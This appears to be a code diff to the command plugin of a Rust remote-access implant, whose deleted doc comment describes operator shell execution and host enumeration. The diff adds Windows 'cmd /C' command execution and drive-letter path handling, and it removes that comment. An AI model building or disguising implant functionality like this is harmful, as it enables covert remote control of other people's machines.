@@ -1,7 +1,3 @@
-//! Built-in command plugin. Provides the basic set of commands an operator
-//! expects from an implant: shell execution, host enumeration, filesystem
-//! navigation, and agent self-management.
-
 use std::env;
 use std::path::PathBuf;
 use std::process::Command;
@@ -15,7 +11,7 @@ pub struct CoreCommands {
 impl CoreCommands {
     pub fn new() -> Self {
         Self {
-            cwd: env::current_dir().unwrap_or_else(|_| PathBuf::from("/")),
+            cwd: env::current_dir().unwrap_or_else(|_| PathBuf::from(".")),
         }
     }
 
@@ -23,13 +19,24 @@ impl CoreCommands {
         if args.is_empty() {
             return Ok(CommandOutput::new("usage: exec <command> [args...]"));
         }
-        let program = &args[0];
-        let rest = &args[1..];
-        let output = Command::new(program)
-            .args(rest)
-            .current_dir(&self.cwd)
-            .output()
-            .map_err(|e| format!("failed to spawn: {e}"))?;
+
+        let output = if cfg!(windows) {
+            let joined = args.join(" ");
+            Command::new("cmd")
+                .args(["/C", &joined])
+                .current_dir(&self.cwd)
+                .output()
+                .map_err(|e| format!("failed to spawn: {e}"))?
+        } else {
+            let program = &args[0];
+            let rest = &args[1..];
+            Command::new(program)
+                .args(rest)
+                .current_dir(&self.cwd)
+                .output()
+                .map_err(|e| format!("failed to spawn: {e}"))?
+        };
+
         let mut stdout = String::from_utf8_lossy(&output.stdout).to_string();
         let stderr = String::from_utf8_lossy(&output.stderr).to_string();
         if !stderr.is_empty() {
@@ -46,7 +53,13 @@ impl CoreCommands {
 
     fn change_dir(&mut self, args: &[String]) -> Result<CommandOutput, PluginError> {
         let target = args.first().map(String::as_str).unwrap_or("/");
-        let new_path = if target.starts_with('/') || target.starts_with('\\') {
+        let new_path = if cfg!(windows) {
+            if target.len() >= 2 && target.as_bytes()[1] == b':' {
+                PathBuf::from(target)
+            } else {
+                self.cwd.join(target)
+            }
+        } else if target.starts_with('/') {
             PathBuf::from(target)
         } else {
             self.cwd.join(target)
